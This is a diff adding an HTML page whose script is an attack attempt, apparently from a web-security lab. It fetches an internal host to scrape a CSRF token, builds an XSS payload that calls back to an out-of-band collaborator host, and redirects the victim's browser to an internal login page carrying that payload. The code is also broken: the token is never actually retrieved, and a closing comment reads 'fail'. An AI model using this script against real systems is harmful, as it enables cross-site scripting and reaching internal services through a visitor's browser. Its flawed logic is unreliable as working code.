@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        collaboratorURL='http://wxxe6za4b8kmp26qvcfl969uglmcady2.oastify.com'
+        localURL='http://192.168.0.5:8080'
+
+        // login 
+        fetch(localURL)
+        .then(response =>{response.text()})
+        .then(text =>{            
+            fuzzingXSS ='"><img src='+collaboratorURL+'?foundXss=1>';            
+            loginPath = '/login?username='+encodeURIComponent(fuzzingXSS)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/);
+            location.href=localURL+loginPath;
+        })
+
+
+    </script>
+    
+</body>
+</html>
+
+<!-- fail -->
